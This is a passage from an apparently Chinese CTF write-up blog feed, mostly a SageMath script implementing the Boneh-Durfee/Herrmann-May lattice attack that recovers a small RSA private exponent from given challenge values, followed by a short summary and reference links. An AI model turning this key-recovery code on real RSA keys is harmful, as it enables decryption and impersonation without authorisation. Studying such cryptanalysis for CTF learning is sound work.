spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> pol2_idx <span class="token keyword">in</span> range<span class="token punctuation">(</span>pol1_idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> nn<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># for i and j, create the two polynomials</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>w<span class="token punctuation">,</span>z<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            pol1 <span class="token operator">=</span> pol2 <span class="token operator">=</span> <span class="token number">0</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>                pol1 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol1_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>                pol2 <span class="token operator">+=</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>w<span class="token operator">*</span>z<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>w<span class="token punctuation">,</span>z<span class="token punctuation">)</span> <span class="token operator">*</span> BB<span class="token punctuation">[</span>pol2_idx<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">/</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># resultant</span>            PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>q<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>            rr <span class="token operator">=</span> pol1<span class="token punctuation">.</span>resultant<span class="token punctuation">(</span>pol2<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># are these good polynomials?</span>            <span class="token keyword">if</span> rr<span class="token punctuation">.</span>is_zero<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">or</span> rr<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"found them, using vectors"</span><span class="token punctuation">,</span> pol1_idx<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> pol2_idx                found_polynomials <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">break</span>        <span class="token keyword">if</span> found_polynomials<span class="token punctuation">:</span>            <span class="token keyword">break</span>    <span class="token keyword">if</span> <span class="token operator">not</span> found_polynomials<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"no independant vectors could be found. This should very rarely happen..."</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    rr <span class="token operator">=</span> rr<span class="token punctuation">(</span>q<span class="token punctuation">,</span> q<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># solutions</span>    soly <span class="token operator">=</span> rr<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>soly<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"Your prediction (delta) is too small"</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>    soly <span class="token operator">=</span> soly<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    ss <span class="token operator">=</span> pol1<span class="token punctuation">(</span>q<span class="token punctuation">,</span> soly<span class="token punctuation">)</span>    solx <span class="token operator">=</span> ss<span class="token punctuation">.</span>roots<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token keyword">return</span> solx<span class="token punctuation">,</span> soly<span class="token keyword">def</span> <span class="token function">example</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">############################################</span>    <span class="token comment" spellcheck="true"># How To Use This Script</span>    <span class="token comment" spellcheck="true">##########################################</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># The problem to solve (edit the following values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># the modulus</span>    N <span class="token operator">=</span> <span class="token number">0xc2fd2913bae61f845ac94e4ee1bb10d8531dda830d31bb221dac5f179a8f883f15046d7aa179aff848db2734b8f88cc73d09f35c445c74ee35b01a96eb7b0a6ad9cb9ccd6c02c3f8c55ecabb55501bb2c318a38cac2db69d510e152756054aaed064ac2a454e46d9b3b755b67b46906fbff8dd9aeca6755909333f5f81bf74db</span>    <span class="token comment" spellcheck="true"># the public exponent</span>    e <span class="token operator">=</span> <span class="token number">0x19441f679c9609f2484eb9b2658d7138252b847b2ed8ad182be7976ed57a3e441af14897ce041f3e07916445b88181c22f510150584eee4b0f776a5a487a4472a99f2ddc95efdd2b380ab4480533808b8c92e63ace57fb42bac8315fa487d03bec86d854314bc2ec4f99b192bb98710be151599d60f224114f6b33f47e357517</span>    <span class="token comment" spellcheck="true"># the hypothesis on the private exponent (the theoretical maximum is 0.292)</span>    delta <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token number">18</span> <span class="token comment" spellcheck="true"># this means that d &lt; N^delta</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Lattice (tweak those values)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># you should tweak this (after a first run), (e.g. increment it until a solution is found)</span>    m <span class="token operator">=</span> <span class="token number">4</span> <span class="token comment" spellcheck="true"># size of the lattice (bigger the better/slower)</span>    <span class="token comment" spellcheck="true"># you need to be a lattice master to tweak these</span>    t <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">-</span><span class="token number">2</span><span class="token operator">*</span>delta<span class="token punctuation">)</span> <span class="token operator">*</span> m<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># optimization from Herrmann and May</span>    X <span class="token operator">=</span> <span class="token number">2</span><span class="token operator">*</span>floor<span class="token punctuation">(</span>N<span class="token operator">^</span>delta<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># this _might_ be too much</span>    Y <span class="token operator">=</span> floor<span class="token punctuation">(</span>N<span class="token operator">^</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># correct if p, q are ~ same size</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Don't touch anything below</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Problem put in equation</span>    P<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    A <span class="token operator">=</span> int<span class="token punctuation">(</span><span class="token punctuation">(</span>N<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">)</span>    pol <span class="token operator">=</span> <span class="token number">1</span> <span class="token operator">+</span> x <span class="token operator">*</span> <span class="token punctuation">(</span>A <span class="token operator">+</span> y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Find the solutions!</span>    <span class="token comment" spellcheck="true">#</span>    <span class="token comment" spellcheck="true"># Checking bounds</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== checking values ==="</span>        <span class="token keyword">print</span> <span class="token string">"* delta:"</span><span class="token punctuation">,</span> delta        <span class="token keyword">print</span> <span class="token string">"* delta &lt; 0.292"</span><span class="token punctuation">,</span> delta <span class="token operator">&lt;</span> <span class="token number">0.292</span>        <span class="token keyword">print</span> <span class="token string">"* size of e:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* size of N:"</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>log<span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token operator">/</span>log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"* m:"</span><span class="token punctuation">,</span> m<span class="token punctuation">,</span> <span class="token string">", t:"</span><span class="token punctuation">,</span> t    <span class="token comment" spellcheck="true"># boneh_durfee</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== running algorithm ==="</span>        start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>    solx<span class="token punctuation">,</span> soly <span class="token operator">=</span> boneh_durfee<span class="token punctuation">(</span>pol<span class="token punctuation">,</span> e<span class="token punctuation">,</span> m<span class="token punctuation">,</span> t<span class="token punctuation">,</span> X<span class="token punctuation">,</span> Y<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># found a solution?</span>    <span class="token keyword">if</span> solx <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== solution found ==="</span>        <span class="token keyword">if</span> <span class="token boolean">False</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"x:"</span><span class="token punctuation">,</span> solx            <span class="token keyword">print</span> <span class="token string">"y:"</span><span class="token punctuation">,</span> soly        d <span class="token operator">=</span> int<span class="token punctuation">(</span>pol<span class="token punctuation">(</span>solx<span class="token punctuation">,</span> soly<span class="token punctuation">)</span> <span class="token operator">/</span> e<span class="token punctuation">)</span>        <span class="token keyword">print</span> <span class="token string">"private key found:"</span><span class="token punctuation">,</span> d    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"=== no solution was found ==="</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"=== %s seconds ==="</span> <span class="token operator">%</span> <span class="token punctuation">(</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    example<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="ğŸˆå°ç»“"><a href="#ğŸˆå°ç»“" class="headerlink" title="ğŸˆå°ç»“"></a>ğŸˆå°ç»“</h2><blockquote><p>è¿™é¢˜å¾ˆå¥½åœ°å¸®è‡ªå·±è®¤è¯†äº†ä¸€æ³¢RSAçš„å„ç§å§¿åŠ¿ï¼Œæ·±å…¥åœ°å­¦ä¹ äº†ä¸€ä¸‹RSAã€‚</p></blockquote><h2 id="ğŸ“•å‚è€ƒ"><a href="#ğŸ“•å‚è€ƒ" class="headerlink" title="ğŸ“•å‚è€ƒ"></a>ğŸ“•å‚è€ƒ</h2><p><a href="http://inaz2.hatenablog.com/entry/2016/01/20/022936" target="_blank" rel="noopener">http://inaz2.hatenablog.com/entry/2016/01/20/022936</a></p><p><a href="https://github.com/mimoo/RSA-and-LLL-attacks" target="_blank" rel="noopener">https://github.com/mimoo/RSA-and-LLL-attacks</a></p><p><a href="https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default" target="_blank" rel="noopener">https://cocalc.com/projects/4d6e5d25-114c-4e64-9f9a-14a88addf2e5/files/2019-05-25-224507.sagews?session=default</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/8654120.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/8654120.html</a></p><p><a href="https://www.cnblogs.com/WangAoBo/p/7541481.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/7541481.html</a></p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¼ºç½‘æ¯ </tag>
            
            <tag> RSA </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>New_start</title>
      <link href="/2019/05/23/New-start/"/>
      <url>/2019/05/23/New-start/</url>
      
